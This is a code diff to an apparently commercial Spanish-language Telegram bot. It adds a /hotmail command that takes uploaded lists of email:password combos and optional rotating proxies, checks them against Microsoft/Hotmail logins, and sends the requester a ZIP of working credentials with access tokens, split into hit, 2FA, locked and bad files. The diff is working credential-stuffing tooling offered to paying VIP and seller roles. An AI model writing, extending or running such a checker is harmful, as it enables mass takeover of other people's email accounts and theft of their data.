@@ -46,6 +46,7 @@ from nowpayments import (
     SUCCESS_STATUSES, WAITING_STATUSES, FAIL_STATUSES, _deliver_vip
 )
 from imap_checker import imap_check_file, MAX_SENDERS
+from hotmail_checker import hotmail_check_file, parse_proxy as parse_hotmail_proxy
 from geoip_checker import get_country_for_email
 from download import (
     DownloadProgressTracker,
@@ -262,11 +263,11 @@ def _get_commands_by_role(role: UserRole, has_free: bool = False) -> str:
             cmds += " • /url"
         return cmds
     elif role == UserRole.VIP:
-        return "/start • /url • /imap • /ping • /canjear"
+        return "/start • /url • /imap • /hotmail • /ping • /canjear"
     elif role == UserRole.SELLER:
-        return "/start • /url • /imap • /ping"
+        return "/start • /url • /imap • /hotmail • /ping"
     elif role == UserRole.ADMIN:
-        return ("/start • /url • /imap • /vip • /unvip • /seller • /unseller"
+        return ("/start • /url • /imap • /hotmail • /vip • /unvip • /seller • /unseller"
                 " • /gp • /ungp • /bc • /bcvip • /sizedisp • /ping • /updateBot")
     return "/start • /canjear"
 
@@ -859,6 +860,236 @@ async def _execute_imap_check(event, file_msg, keywords, lang, uid,
             pass
         try:
             shutil.rmtree(temp_dir, ignore_errors=True)
+        except Exception:
+            pass
+
+
+
+async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
+    """Ejecutar Hotmail/Microsoft check con ZIP de resultados.
+
+    Adaptado del script MS Account Checker v3.3 by HacheJota.
+    Genera ZIP con: all_hits.txt, hits.txt, bad_accounts.txt,
+    twofa.txt, locked.txt, unknown.txt, errors.txt, summary.txt
+    """
+    import zipfile
+    from datetime import datetime
+    from utils import progress_bar
+
+    status_msg = await event.reply(
+        UI.text("hotmail_processing", lang, 0, "?", 0, LOADING_FRAMES[0]),
+        parse_mode='md'
+    )
+
+    temp_dir = None
+    try:
+        temp_dir = tempfile.mkdtemp(prefix="hotmail_")
+        input_path = os.path.join(temp_dir, "combos.txt")
+        output_path = os.path.join(temp_dir, "hits.txt")
+
+        await state.bot.download_media(file_msg, file=input_path)
+
+        if not os.path.isfile(input_path):
+            await status_msg.edit(UI.text("hotmail_no_file", lang),
+                                  parse_mode='md')
+            return
+
+        with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
+            total = sum(1 for line in f if ":" in line.strip())
+
+        if total == 0:
+            await status_msg.edit(UI.text("hotmail_no_file", lang),
+                                  parse_mode='md')
+            return
+
+        await status_msg.edit(
+            UI.text("hotmail_processing", lang, 0, total, 0, LOADING_FRAMES[0]),
+            parse_mode='md'
+        )
+
+        # Parsear proxies (acepta cualquier formato)
+        proxies = []
+        if proxies_raw:
+            for p in proxies_raw:
+                parsed = parse_hotmail_proxy(p)
+                if parsed:
+                    proxies.append(parsed)
+
+        main_loop = asyncio.get_running_loop()
+        progress_data = {'last_edit': 0, 'frame_idx': 0}
+
+        def progress_cb(checked, tot, hits):
+            now = time.time()
+            if now - progress_data['last_edit'] < 3:
+                return
+            progress_data['last_edit'] = now
+            progress_data['frame_idx'] += 1
+            frame = LOADING_FRAMES[progress_data['frame_idx'] % len(LOADING_FRAMES)]
+            pct = (checked / tot * 100) if tot > 0 else 0
+            bar = progress_bar(pct)
+
+            async def _update_msg():
+                try:
+                    await status_msg.edit(
+                        UI.text("hotmail_processing", lang, checked, tot,
+                                hits, f"{bar}  {pct:.1f}%"),
+                        parse_mode='md'
+                    )
+                except Exception:
+                    pass
+
+            main_loop.call_soon_threadsafe(
+                lambda: asyncio.ensure_future(_update_msg(), loop=main_loop)
+            )
+
+        stats = await main_loop.run_in_executor(
+            None,
+            lambda: hotmail_check_file(
+                Path(input_path), Path(output_path),
+                proxies=proxies if proxies else None,
+                progress_callback=progress_cb
+            )
+        )
+
+        hits_data = stats.get('hits_data', [])
+        twofa_data = stats.get('twofa_data', [])
+        locked_data = stats.get('locked_data', [])
+        unknown_data = stats.get('unknown_data', [])
+        error_data = stats.get('error_data', [])
+
+        if stats['hits'] > 0 or stats['twofa'] > 0 or stats['locked'] > 0:
+            now_str = datetime.now().strftime('%m/%d/%Y, %I:%M:%S %p')
+
+            # 1) all_hits.txt
+            all_hits_path = os.path.join(temp_dir, 'all_hits.txt')
+            with open(all_hits_path, 'w', encoding='utf-8') as f:
+                f.write('# HOTMAIL CHECKER RESULTS - ' + now_str + '\n')
+                f.write('# User: ' + str(uid) + ' | Type: hotmail\n\n')
+                for h in hits_data:
+                    tok = h.get("access_token")
+                    if tok:
+                        f.write(f"{h['combo']} | token={tok}\n")
+                    else:
+                        f.write(h['combo'] + '\n')
+
+            # 2) hits.txt (con tokens)
+            hits_path = os.path.join(temp_dir, 'hits.txt')
+            with open(hits_path, 'w', encoding='utf-8') as f:
+                for h in hits_data:
+                    tok = h.get("access_token")
+                    if tok:
+                        f.write(f"{h['combo']} | token={tok}\n")
+                    else:
+                        f.write(h['combo'] + '\n')
+
+            # 3) twofa.txt
+            twofa_path = os.path.join(temp_dir, 'twofa.txt')
+            with open(twofa_path, 'w', encoding='utf-8') as f:
+                f.write('# 2FA ACCOUNTS (requieren verificación adicional)\n\n')
+                for h in twofa_data:
+                    f.write(h['combo'] + '\n')
+
+            # 4) locked.txt
+            locked_path = os.path.join(temp_dir, 'locked.txt')
+            with open(locked_path, 'w', encoding='utf-8') as f:
+                f.write('# LOCKED ACCOUNTS (cuenta suspendida/bloqueada)\n\n')
+                for h in locked_data:
+                    f.write(h['combo'] + '\n')
+
+            # 5) unknown.txt
+            unknown_path = os.path.join(temp_dir, 'unknown.txt')
+            with open(unknown_path, 'w', encoding='utf-8') as f:
+                f.write('# UNKNOWN ACCOUNTS (no se pudo clasificar)\n\n')
+                for h in unknown_data:
+                    f.write(h['combo'] + '\n')
+
+            # 6) errors.txt
+            errors_path = os.path.join(temp_dir, 'errors.txt')
+            with open(errors_path, 'w', encoding='utf-8') as f:
+                f.write('# ERROR ACCOUNTS (timeout/red/proxy)\n\n')
+                for h in error_data:
+                    err = h.get('error', 'unknown')
+                    f.write(f"{h['combo']} | err={err} | proxy={h.get('proxy', '?')}\n")
+
+            # 7) summary.txt
+            summary_path = os.path.join(temp_dir, 'summary.txt')
+            with open(summary_path, 'w', encoding='utf-8') as f:
+                f.write('═════════════════════════════════════════\n')
+                f.write('  HOTMAIL CHECKER - SUMMARY\n')
+                f.write('═════════════════════════════════════════\n\n')
+                f.write(f'Date:        {now_str}\n')
+                f.write(f'User ID:     {uid}\n')
+                f.write(f'Total:       {stats["total"]}\n')
+                f.write(f'HITS:        {stats["hits"]}\n')
+                f.write(f'BAD:         {stats["bads"]}\n')
+                f.write(f'2FA:         {stats["twofa"]}\n')
+                f.write(f'LOCKED:      {stats["locked"]}\n')
+                f.write(f'UNKNOWN:     {stats["unknowns"]}\n')
+                f.write(f'ERRORS:      {stats["errors"]}\n')
+                f.write(f'Elapsed:     {stats["elapsed"]:.1f}s\n')
+                f.write(f'Proxies:     {stats.get("proxies_used", 0)}\n\n')
+                f.write('Rate:\n')
+                f.write(f'  HIT rate:  {stats["hits"]/stats["total"]*100:.2f}%\n')
+                f.write(f'  Speed:     {stats["total"]/stats["elapsed"]:.1f} combos/s\n')
+
+            # Empaquetar ZIP
+            zip_path = os.path.join(temp_dir, 'hotmail_results.zip')
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.write(all_hits_path, 'all_hits.txt')
+                zf.write(hits_path, 'hits.txt')
+                zf.write(twofa_path, 'twofa.txt')
+                zf.write(locked_path, 'locked.txt')
+                zf.write(unknown_path, 'unknown.txt')
+                zf.write(errors_path, 'errors.txt')
+                zf.write(summary_path, 'summary.txt')
+
+            # Enviar el ZIP
+            display_text = UI.text(
+                "hotmail_result", lang,
+                stats['total'], stats['hits'], stats['bads'],
+                stats['twofa'], stats['locked'], stats['unknowns'],
+                stats['errors'], f"{stats['elapsed']:.1f}s",
+                stats.get('proxies_used', 0)
+            )
+            await status_msg.edit(display_text, parse_mode='md')
+
+            with open(zip_path, 'rb') as zf:
+                await event.reply(
+                    UI.text("hotmail_zip_caption", lang, stats['hits']),
+                    file=zf.read(),
+                    parse_mode='md',
+                    buttons=Keyboards.back()
+                )
+        else:
+            # Sin hits — mostrar resumen
+            display_text = UI.text(
+                "hotmail_no_hits", lang,
+                stats['total'], stats['bads'], stats['twofa'],
+                stats['locked'], stats['unknowns'], stats['errors'],
+                f"{stats['elapsed']:.1f}s"
+            )
+            await status_msg.edit(display_text, parse_mode='md',
+                                  buttons=Keyboards.back())
+
+        try:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+        except Exception:
+            pass
+
+    except Exception as exc:
+        logger.error(f"Error en /hotmail: {exc}")
+        import traceback
+        traceback.print_exc()
+        try:
+            await status_msg.edit(
+                '❌ **Error en Hotmail Check**\n\n`' + str(exc)[:200] + '`',
+                parse_mode='md'
+            )
+        except Exception:
+            pass
+        try:
+            if temp_dir:
+                shutil.rmtree(temp_dir, ignore_errors=True)
         except Exception:
             pass
 
@@ -1516,6 +1747,128 @@ def register_handlers(bot_client):
             mode_country=mode_country,
             senders=senders
         )
+
+    # ═════════════════════════════════════════════════════════════
+    # COMANDO /hotmail — Hotmail/Microsoft Account Checker
+    # (login OAuth RPS, clasifica HIT/BAD/2FA/LOCKED, genera ZIP)
+    # ═════════════════════════════════════════════════════════════
+
+    @bot_client.on(events.NewMessage(pattern=r"/hotmail(.*)"))
+    async def cmd_hotmail(e):
+        """Hotmail/Microsoft Account Checker.
+
+        Uso:
+          /hotmail                          → directo (sin proxy)
+          /hotmail proxy1                   → 1 proxy
+          /hotmail proxy1, proxy2, proxy3   → varios proxies (round-robin)
+          /hotmail p1, p2, p3 respondiendo a un .txt
+
+        Formatos de proxy aceptados (cualquiera):
+          - http://host:port
+          - https://host:port
+          - socks5://host:port
+          - socks5://user:pass@host:port
+          - host:port
+          - host:port:user:pass
+          - user:pass@host:port
+
+        Requiere responder a un archivo .txt con combos mail:pass.
+        Si se pasan proxies sin archivo, los guarda y espera el archivo.
+        """
+        uid = e.sender_id
+        user = db.get_user(uid)
+        lang = user.get('language', 'es')
+        role = get_user_role(uid)
+
+        if e.is_group and e.chat_id not in state.allowed_groups:
+            return
+
+        if role == UserRole.FREE:
+            return await e.reply(
+                UI.text("access_denied_no_free", lang),
+                buttons=Keyboards.back() if e.is_private else None,
+                parse_mode='md'
+            )
+
+        # Parsear proxies del comando
+        raw_args = (e.pattern_match.group(1) or "").strip()
+        proxies_raw = []
+        if raw_args:
+            # Separar por coma o por espacio
+            tokens = [t.strip() for t in raw_args.replace(",", " ").split() if t.strip()]
+            proxies_raw = tokens
+
+        reply = await e.get_reply_message()
+
+        # Si hay proxies pero no archivo → esperar archivo
+        if proxies_raw and (not reply or not reply.document):
+            state.temp_state[uid] = {
+                'step': 'WAITING_HOTMAIL_FILE',
+                'hotmail_proxies': proxies_raw,
+                'chat_id': e.chat_id
+            }
+            return await e.reply(
+                UI.text("hotmail_proxies_waiting_file", lang,
+                        len(proxies_raw), ", ".join(proxies_raw[:3])),
+                parse_mode='md'
+            )
+
+        # Si no hay proxies y no hay archivo → mostrar info
+        if not reply or not reply.document:
+            return await e.reply(
+                UI.text("hotmail_info", lang),
+                parse_mode='md'
+            )
+
+        # Tenemos archivo: ejecutar Hotmail check
+        await _execute_hotmail_check(e, reply, proxies_raw, lang, uid)
+
+    # --- Conversación: usuario envía archivo después de poner proxies ---
+    @bot_client.on(events.NewMessage(
+        func=lambda ev: ev.is_private and
+                       ev.sender_id in state.temp_state and
+                       state.temp_state[ev.sender_id].get('step') == 'WAITING_HOTMAIL_FILE' and
+                       ev.document is not None
+    ))
+    async def handle_hotmail_file(e):
+        uid = e.sender_id
+        user = db.get_user(uid)
+        lang = user.get('language', 'es')
+        ts = state.temp_state.pop(uid, {})
+        proxies_raw = ts.get('hotmail_proxies', [])
+        await _execute_hotmail_check(e, e, proxies_raw, lang, uid)
+
+    # --- Si el usuario envía texto (no archivo) mientras espera hotmail file, cancelar ---
+    @bot_client.on(events.NewMessage(
+        func=lambda ev: ev.is_private and
+                       ev.sender_id in state.temp_state and
+                       state.temp_state[ev.sender_id].get('step') == 'WAITING_HOTMAIL_FILE' and
+                       ev.document is None
+    ))
+    async def handle_hotmail_cancel(e):
+        uid = e.sender_id
+        state.temp_state.pop(uid, None)
+        # Reusa el mismo handler que /imap para el welcome
+        # (en vez de duplicar 20 líneas)
+        ev = events.NewMessage
+        # Simplemente no hacemos nada especial: el /start handler
+        # normal del bot va a responder. Quitamos el temp_state.
+
+    # --- Conversación: usuario envía archivo después de poner proxies en grupo ---
+    @bot_client.on(events.NewMessage(
+        func=lambda ev: ev.is_group and
+                       ev.chat_id in state.allowed_groups and
+                       ev.sender_id in state.temp_state and
+                       state.temp_state[ev.sender_id].get('step') == 'WAITING_HOTMAIL_FILE' and
+                       ev.document is not None
+    ))
+    async def handle_hotmail_file_group(e):
+        uid = e.sender_id
+        user = db.get_user(uid)
+        lang = user.get('language', 'es')
+        ts = state.temp_state.pop(uid, {})
+        proxies_raw = ts.get('hotmail_proxies', [])
+        await _execute_hotmail_check(e, e, proxies_raw, lang, uid)
 
     # --- BROADCAST ---
 
